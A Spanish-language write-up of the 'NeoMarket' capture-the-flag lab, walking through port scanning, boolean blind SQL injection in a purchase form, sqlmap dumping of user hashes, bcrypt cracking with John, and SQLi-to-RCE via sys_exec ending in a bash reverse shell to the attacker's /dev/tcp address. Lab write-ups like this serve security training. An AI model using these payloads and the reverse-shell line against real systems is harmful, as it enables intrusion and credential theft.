---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NeoMarket  BugBountyLabs (Avanzado)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 08:24 EDT
Nmap scan report for 192.168.1.152
Host is up (0.00040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://neomarket.bbl
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:08:BB:A9 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

Vemos que hay un puerto `80` en el que si entramos veremos que nos pide un dominio llamado `neomarket.bbl`, por lo que meteremos en nuestro archivo `hosts` el siguiente dominio.

```shell
nano /etc/hosts

#Dentro del nano
<IP>               neomarket.bbl
```

Lo guardamos y volveremos a cargarlo, con esto ya veremos una pagina web en la que tendremos varias cosas, entre ellas veremos un `login` y un `register`, vamos a probar a realizar un `SQL Injection` en el `login`.

Pero veremos que no funciona, vamos a registrarnos, una vez echo, si nos vamos a la seccion de `Compras` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

Puede ser un buen punto de inyeccion uno de estos `2` campos, por lo que vamos abrir `BurpSuite` y capturar la peticion, veremos algo asi:

```
POST /compras.php HTTP/1.1
Host: neomarket.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://neomarket.bbl
Connection: keep-alive
Referer: http://neomarket.bbl/compras.php
Cookie: PHPSESSID=a38g9k6en1cd6p4mdhnmr6iduh; registros=2; consultas=6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=2&cantidad=10&buy_articulo=Comprar
```

Vamos a ver si en el parametro de `id` puede ser vulnerable, poniendo lo siguiente:

```
id=1'
```

Dejando la peticion de la siguiente forma:

```
POST /compras.php HTTP/1.1
Host: neomarket.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://neomarket.bbl
Connection: keep-alive
Referer: http://neomarket.bbl/compras.php
Cookie: PHPSESSID=a38g9k6en1cd6p4mdhnmr6iduh; registros=2; consultas=6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1'&cantidad=5&buy_articulo=Comprar
```

Cuando lo enviemos veremos que la respuesta del servidor es la siguiente:

<figure><img src="../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

Por lo que si es vulnerable ya que esta habiendo algun error a nivel de codigo y el servidor no lo puede llegar a procesar bien ya que se esta tragando la `'` y peta, por lo que vamos a probar a meter algunos `payloads` para ver por donde va la tecnica.

Si probamos a meter lo siguiente:

```
id=1'+AND+1=1--+-
```

Dejando la peticion de esta forma:

```
POST /compras.php HTTP/1.1
Host: neomarket.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://neomarket.bbl
Connection: keep-alive
Referer: http://neomarket.bbl/compras.php
Cookie: PHPSESSID=a38g9k6en1cd6p4mdhnmr6iduh; registros=2; consultas=6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1'+AND+1=1--+-&cantidad=1&buy_articulo=Comprar
```

<figure><img src="../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

Cuando volvemos a la pagina vemos que el articulo se ha comprado de forma correcta, pero si ponemos alguna condicion que no se cumpla.

```
id=1'+AND+1=2--+-
```

<figure><img src="../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

Cuando la enviemos veremos que el articulo no se ha comprado, por lo que hace caso a este tipo de inyecciones `blooleanas` por lo que podremos deducir que estamos antes un `SQL Injection booleano`.

Pero lo que vamos hacer para automatizar todo esto es utilizar la herramienta de `sqlmap` capturando la peticion de `BurpSuite` y utilizando dicha peticion para que obtenga el parametro vulnerable en este caso el `id` y haga sus pruebas en ese parametro.

## sqlmap

> request.txt

```
POST /compras.php HTTP/1.1
Host: neomarket.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://neomarket.bbl
Connection: keep-alive
Referer: http://neomarket.bbl/compras.php
Cookie: PHPSESSID=a38g9k6en1cd6p4mdhnmr6iduh; registros=2; consultas=6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1&cantidad=1&buy_articulo=Comprar
```

Ahora ejecutaremos el siguiente comando:

```shell
sqlmap -r request.txt -p "id" --dbs --level=5 --risk=3
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.8.11#stable}                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:01:42 /2025-03-21/

[09:01:42] [INFO] parsing HTTP request from 'request.txt'
[09:01:42] [INFO] testing connection to the target URL
got a 302 redirect to 'http://neomarket.bbl/compras.php'. Do you want to follow? [Y/n] 

redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
[09:01:43] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:01:43] [INFO] testing if the target URL content is stable
[09:01:43] [WARNING] heuristic (basic) test shows that POST parameter 'id' might not be injectable
[09:01:43] [INFO] testing for SQL injection on POST parameter 'id'
[09:01:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:01:44] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[09:01:44] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Microsoft Access' 
it looks like the back-end DBMS is 'Microsoft Access'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

[09:01:46] [INFO] testing 'Generic inline queries'
[09:01:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:01:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:01:46] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[09:01:46] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[09:01:46] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[09:01:46] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[09:01:46] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[09:01:47] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[09:01:47] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[09:01:47] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[09:01:47] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[09:01:47] [INFO] checking if the injection point on POST parameter 'id' is a false positive
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 268 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7591=7591-- MlFi&cantidad=1&buy_articulo=Comprar
---
[09:01:50] [INFO] testing Microsoft Access
[09:01:50] [WARNING] the back-end DBMS is not Microsoft Access
[09:01:50] [INFO] testing MySQL
[09:01:50] [INFO] confirming MySQL
[09:01:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 8.0.0
[09:01:50] [INFO] fetching database names
[09:01:50] [INFO] fetching number of databases
[09:01:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[09:01:50] [INFO] retrieved: 3
[09:01:50] [INFO] retrieved: information_schema
[09:01:52] [INFO] retrieved: performance_schema
[09:01:53] [INFO] retrieved: shop
available databases [3]:
[*] information_schema
[*] performance_schema
[*] shop

[09:01:53] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 364 times
[09:01:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/neomarket.bbl'

[*] ending @ 09:01:53 /2025-03-21/
```

Vemos que nos muestra las bases de datos, entre ellas una muy interesante llamada `shop` por lo que sacaremos las tablas de dicha base de datos:

```shell
sqlmap -r request.txt -p id --level=5 --risk=3 -D shop --tables
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.8.11#stable}                                                                                                                    
|_ -| . [)]     | .'| . |                                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:04:38 /2025-03-21/

[09:04:38] [INFO] parsing HTTP request from 'request.txt'
[09:04:38] [INFO] resuming back-end DBMS 'mysql' 
[09:04:38] [INFO] testing connection to the target URL
got a 302 redirect to 'http://neomarket.bbl/compras.php'. Do you want to follow? [Y/n] 

redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7591=7591-- MlFi&cantidad=1&buy_articulo=Comprar
---
[09:05:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL 8
[09:05:25] [INFO] fetching tables for database: 'shop'
[09:05:25] [INFO] fetching number of tables for database 'shop'
[09:05:25] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[09:05:25] [INFO] retrieved: 2
[09:05:25] [INFO] retrieved: articles
[09:05:26] [INFO] retrieved: users
Database: shop
[2 tables]
+----------+
| articles |
| users    |
+----------+

[09:05:26] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 55 times
[09:05:26] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/neomarket.bbl'

[*] ending @ 09:05:26 /2025-03-21/
```

Ahora veremos que nos saca dos tablas entre ellas la mas atractiva llamada `users`, por lo que vamos a ver las columnas o informacion de dicha tabla.

```shell
sqlmap -r request.txt -p id --level=5 --risk=3 -D shop -T users --dump
```

Info:

```
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:07:15 /2025-03-21/

[09:07:15] [INFO] parsing HTTP request from 'request.txt'
[09:07:15] [INFO] resuming back-end DBMS 'mysql' 
[09:07:15] [INFO] testing connection to the target URL
got a 302 redirect to 'http://neomarket.bbl/compras.php'. Do you want to follow? [Y/n] 

redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7591=7591-- MlFi&cantidad=1&buy_articulo=Comprar
---
[09:07:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL 8
[09:07:18] [INFO] fetching columns for table 'users' in database 'shop'
[09:07:18] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[09:07:18] [INFO] retrieved: 8
[09:07:18] [INFO] retrieved: dni
[09:07:18] [INFO] retrieved: username
[09:07:19] [INFO] retrieved: password
[09:07:20] [INFO] retrieved: name
[09:07:20] [INFO] retrieved: mail
[09:07:20] [INFO] retrieved: phone
[09:07:21] [INFO] retrieved: image
[09:07:21] [INFO] retrieved: apellidos
[09:07:22] [INFO] fetching entries for table 'users' in database 'shop'
[09:07:22] [INFO] fetching number of entries for table 'users' in database 'shop'
[09:07:22] [INFO] retrieved: 2
[09:07:22] [INFO] retrieved: Jose
[09:07:22] [INFO] retrieved: Luis
[09:07:23] [INFO] retrieved: 12345676N
[09:07:23] [INFO] retrieved: uploads/12345676N-123456789_admin.jpg
[09:07:26] [INFO] retrieved: admin@neomarket.bbl
[09:07:28] [INFO] retrieved: $2y$10$eSNt.VwyKFUryoPxEJOZTu0OG8sux3S7G1nBF8VetEVIgeOp/q1gC
[09:07:33] [INFO] retrieved: 123456789
[09:07:33] [INFO] retrieved: admin
[09:07:34] [INFO] retrieved: diseo
[09:07:34] [INFO] retrieved: diseo
[09:07:34] [INFO] retrieved: 12345678Z
[09:07:35] [INFO] retrieved: uploads/12345678Z-123456799_diseo.png
[09:07:38] [INFO] retrieved: diseo@test.com
[09:07:39] [INFO] retrieved: $2y$10$JsTW/umdTGcd3ZgRd1jAoOB4UnTr5q9tjnYpvVZ.IM6I/jCbfDtxG
[09:07:44] [INFO] retrieved: 123456799
[09:07:45] [INFO] retrieved: diseo
Database: shop
Table: users
[2 entries]
+-----------+---------------------+---------------------------------------+-----------+--------+--------------------------------------------------------------+----------+-----------+
| dni       | mail                | image                                 | phone     | name   | password                                                     | username | apellidos |
+-----------+---------------------+---------------------------------------+-----------+--------+--------------------------------------------------------------+----------+-----------+
| 12345676N | admin@neomarket.bbl | uploads/12345676N-123456789_admin.jpg | 123456789 | Jose   | $2y$10$eSNt.VwyKFUryoPxEJOZTu0OG8sux3S7G1nBF8VetEVIgeOp/q1gC | admin    | Luis      |
| 12345678Z | diseo@test.com      | uploads/12345678Z-123456799_diseo.png | 123456799 | diseo  | $2y$10$JsTW/umdTGcd3ZgRd1jAoOB4UnTr5q9tjnYpvVZ.IM6I/jCbfDtxG | diseo    | diseo     |
+-----------+---------------------+---------------------------------------+-----------+--------+--------------------------------------------------------------+----------+-----------+

[09:07:45] [INFO] table 'shop.users' dumped to CSV file '/root/.local/share/sqlmap/output/neomarket.bbl/dump/shop/users.csv'
[09:07:45] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1232 times
[09:07:45] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/neomarket.bbl'

[*] ending @ 09:07:45 /2025-03-21/
```

Vemos que nos saca las credenciales del usuario `admin` el otro usuario lo cree yo, por lo que vamos a probar a `crackear` la contraseña del usuario `admin`.

### John (crack)

> hash

```
admin:$2y$10$eSNt.VwyKFUryoPxEJOZTu0OG8sux3S7G1nBF8VetEVIgeOp/q1gC
```

Ejecutaremos lo siguiente:

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
speaker          (admin)     
1g 0:00:00:50 DONE (2025-03-21 09:10) 0.01983g/s 99.24p/s 99.24c/s 99.24C/s marlen..jarvis
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que la contraseña es `speaker`, pero si iniciamos sesion como dicho usuario no veremos nada, por lo que vamos a buscar alguna forma de ejecutar codigo de forma remota (`RCE`) mediante un `SQL Injection (RCE)`.

### SQL Injection (RCE)

Si por ejemplo probamos a realizar lo siguiente:

```
'+OR+1=1+AND+sys_exec('wget+http://<IP>:8000/test')--+-
```

Para ver si se esta ejecutando codigo de forma remota, antes de enviar dicha peticion abriremos un servidor de `python3` para ver si nos llega.

```shell
python3 -m http.server
```

Nos tendra que quedar algo asi la peticion:

```
POST /compras.php HTTP/1.1
Host: neomarket.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://neomarket.bbl
Connection: keep-alive
Referer: http://neomarket.bbl/compras.php
Cookie: registros=1; consultas=10; PHPSESSID=8qm6vvk59pvrev49uuam23dfla
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1'+OR+1=1+AND+sys_exec('wget+http://<IP>:8000/test')--+-&cantidad=5&buy_articulo=Comprar
```

Una vez que enviemos eso, si nos vamos a nuestro servidor de `python3` veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.152 - - [24/Mar/2025 13:32:46] code 404, message File not found
192.168.1.152 - - [24/Mar/2025 13:32:46] "GET /test HTTP/1.1" 404 -
```

Vemos que a funcionado de forma correcta, por lo que ahora vamos a ejecutar una `reverse shell` para obtener acceso a la maquina de la siguiente forma:

```
' OR 1=1 AND sys_exec('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"')-- -
```

Pero tendremos que codificarlo en `URLCode` quedando de la siguiente forma:

```
%27%20OR%201%3D1%20AND%20sys_exec%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.146%2F7777%200%3E%261%22%27%29--%20-
```

Ahora dejandolo de la siguiente forma:

```
POST /compras.php HTTP/1.1
Host: neomarket.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://neomarket.bbl
Connection: keep-alive
Referer: http://neomarket.bbl/compras.php
Cookie: registros=1; consultas=10; PHPSESSID=8qm6vvk59pvrev49uuam23dfla
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1%27%20OR%201%3D1%20AND%20sys_exec%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.146%2F7777%200%3E%261%22%27%29--%20-&cantidad=5&buy_articulo=Comprar
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y si enviamos la peticion y volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.152] 44014
bash: no se puede establecer el grupo de proceso de terminal (521): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
mysql@neomarket:~$ whoami
whoami
mysql
```

Vemos que ha funcionado y entraremos como el usuario `mysql`, por lo que ya habremos terminado la maquina, habiendo explotado de forma correcta la vulnerabilidad de un `SQLi`.

Ahora leeremos la `flag` de la maquina:

> flag.txt

```
ef9e86d644a84fc8cd1c135fd5a3a916
```
